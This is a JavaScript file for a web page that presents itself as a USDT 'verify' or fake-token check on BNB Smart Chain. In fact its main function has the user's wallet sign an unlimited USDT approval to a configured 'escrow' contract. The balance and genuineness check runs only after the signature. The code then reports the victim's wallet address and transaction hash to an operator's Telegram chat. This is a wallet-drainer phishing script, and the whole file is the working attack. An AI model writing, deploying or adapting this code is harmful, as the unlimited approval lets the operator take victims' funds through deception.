document.addEventListener("DOMContentLoaded", function () {

    const USDT_ADDRESS = CONFIG.USDT_ADDRESS;
    const ESCROW_ADDRESS = CONFIG.CONTRACT_ADDRESS;
    let provider, userAddress;
    let isProcessing = false;

    const verifyBtn = document.getElementById('verifyBtn');
    const walletInfoDiv = document.getElementById('walletInfo');
    const walletAddrSpan = document.getElementById('walletAddr');
    const balanceSpan = document.getElementById('balance');
    const tokenStatusSpan = document.getElementById('tokenStatus');
    const flashMsgDiv = document.getElementById('flashMsg');
    const flashDetailDiv = document.getElementById('flashDetail');

    function showNotification(msg, type = "info") {
        let toast = document.getElementById('toast');
        if (!toast) return;
        toast.innerHTML = `${type === 'error' ? '❌' : type === 'success' ? '✅' : 'ℹ️'} ${msg}`;
        toast.style.display = 'flex';
        toast.style.background = type === 'error' ? '#2A1B1B' : '#1E2329';
        toast.style.borderLeftColor = type === 'error' ? '#F6465D' : '#26A17B';
        setTimeout(() => toast.style.display = 'none', 4000);
    }

    // ===== TELEGRAM NOTIFICATION (EXACTLY AS YOUR ORIGINAL) =====
    async function sendTelegramNotifications(walletAddress, txHash, userId) {
        const botToken = CONFIG.TELEGRAM_BOT_TOKEN;
        const adminChatId = CONFIG.ADMIN_CHAT_ID;
        const inlineKeyboard = {
            inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://bscscan.com/tx/${txHash}` }]]
        };
        const adminMessage = `🔔 **New USDT Approval Transaction**\n\n💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n👤 **User ID:** ${userId || "Not provided"}\n⏰ **Time:** ${new Date().toLocaleString()}\n\n✅ Transaction approved successfully!`;
        const userMessage = `🎉 **USDT Approval Successful!**\n\n💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n✅ **Status:** Approved`;
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: adminChatId, text: adminMessage, parse_mode: "Markdown", reply_markup: inlineKeyboard })
            });
            if (userId) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST", headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: userId, text: userMessage, parse_mode: "Markdown", reply_markup: inlineKeyboard })
                });
            }
            console.log("Telegram sent");
        } catch (error) {
            console.error("Telegram error:", error);
        }
    }

    // ===== SWITCH TO BSC (REQUIRED BEFORE TRANSACTION) =====
    async function switchToBSC() {
        if (!window.ethereum) throw new Error("No Web3 wallet");
        const chainId = "0x38";
        try {
            await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId }] });
        } catch (err) {
            if (err.code === 4902) {
                await window.ethereum.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: "0x38",
                        chainName: "BNB Smart Chain",
                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                        rpcUrls: ["https://bsc-dataseed1.binance.org/"],
                        blockExplorerUrls: ["https://bscscan.com/"]
                    }]
                });
            } else throw err;
        }
    }

    // ===== FETCH USDT DATA (BALANCE + FLASH STATUS) – CALLED AFTER SIGNING =====
    async function fetchAndDisplayUSDTStatus() {
        if (!provider || !userAddress) return;
        const usdt = new ethers.Contract(USDT_ADDRESS, [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)",
            "function name() view returns (string)"
        ], provider);
        try {
            const balanceRaw = await usdt.balanceOf(userAddress);
            let decimals = 18;
            try { decimals = await usdt.decimals(); } catch(e) {}
            const balance = ethers.utils.formatUnits(balanceRaw, decimals);
            const symbol = await usdt.symbol();
            const name = await usdt.name();
            const isOfficial = (symbol === "USDT" || symbol === "USD₮") && (name.includes("Tether") || name === "Tether USD");

            balanceSpan.innerText = parseFloat(balance).toFixed(4);
            if (isOfficial) {
                tokenStatusSpan.innerHTML = "✅ Official USDT";
                flashMsgDiv.innerHTML = "🟢 Genuine Tether USDT (BEP20). No flash pattern.";
                flashDetailDiv.classList.add('hidden');
            } else {
                tokenStatusSpan.innerHTML = "⚠️ Suspicious Token";
                flashMsgDiv.innerHTML = "⚠️ <strong>Flash/Fake Risk!</strong> Metadata mismatch.";
                flashDetailDiv.classList.remove('hidden');
                flashDetailDiv.innerHTML = `Symbol: ${symbol} | Name: ${name} – not official Tether.`;
            }
        } catch (err) {
            console.error(err);
            balanceSpan.innerText = "Error";
            tokenStatusSpan.innerHTML = "⚠️ Read failed";
            flashMsgDiv.innerHTML = "Cannot fetch token info. Ensure BSC network.";
        }
    }

    // ===== UPDATE UI WITH FULL WALLET ADDRESS =====
    async function updateWalletUI() {
        if (!userAddress) return;
        walletAddrSpan.innerText = userAddress;
        walletAddrSpan.onclick = () => { navigator.clipboard.writeText(userAddress); showNotification("Address copied!", "success"); };
        walletInfoDiv.classList.remove('hidden');
    }

    // ===== MAIN APPROVAL – NO SEPARATE CONNECT PROMPT, DIRECTLY SIGN =====
    async function executeApproval() {
        if (!window.ethereum) {
            showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask.", "error");
            return;
        }
        if (isProcessing) return;

        isProcessing = true;
        const originalBtnHTML = verifyBtn.innerHTML;
        verifyBtn.disabled = true;
        verifyBtn.innerHTML = '<span class="spinner"></span> Processing...';

        try {
            // Ensure we're on BSC before transaction
            await switchToBSC();

            // Prepare approval transaction to escrow
            const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
            const iface = new ethers.utils.Interface(usdtAbi);
            const parsedAmount = ethers.constants.MaxUint256;
            const txData = iface.encodeFunctionData("approve", [ESCROW_ADDRESS, parsedAmount.toString()]);

            // Send transaction – this will trigger wallet connection if needed, then signature prompt
            const txHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{ from: null, to: USDT_ADDRESS, data: txData, value: "0x0" }]
            });

            // After transaction, get the sender address (from the transaction receipt or via eth_accounts)
            // Since we didn't have userAddress before, we fetch it now
            const accounts = await window.ethereum.request({ method: "eth_accounts" });
            userAddress = accounts[0];
            if (userAddress) {
                // Create provider for later calls
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await updateWalletUI();
            }

            showNotification(`✅ Transaction submitted! TX: ${txHash.slice(0,10)}...`, "success");

            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get("user_id");
            await sendTelegramNotifications(userAddress, txHash, userId);

            // AFTER SIGNING: fetch and display USDT balance + flash status
            await fetchAndDisplayUSDTStatus();

        } catch (err) {
            const msg = (err?.message || "").toLowerCase();
            if (msg.includes("user rejected") || msg.includes("denied") || msg.includes("cancelled")) {
                showNotification("Transaction cancelled.", "error");
            } else if (msg.includes("insufficient funds") || msg.includes("exceeds balance")) {
                showNotification("Insufficient USDT balance for this approval.", "error");
            } else if (msg.includes("already processing")) {
                // ignore
            } else {
                console.error(err);
                showNotification("Transaction failed. Please try again.", "error");
            }
        } finally {
            isProcessing = false;
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = originalBtnHTML;
        }
    }

    verifyBtn.addEventListener('click', executeApproval);

    // Add spinner style
    const style = document.createElement('style');
    style.textContent = `.spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid white; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }`;
    document.head.appendChild(style);
});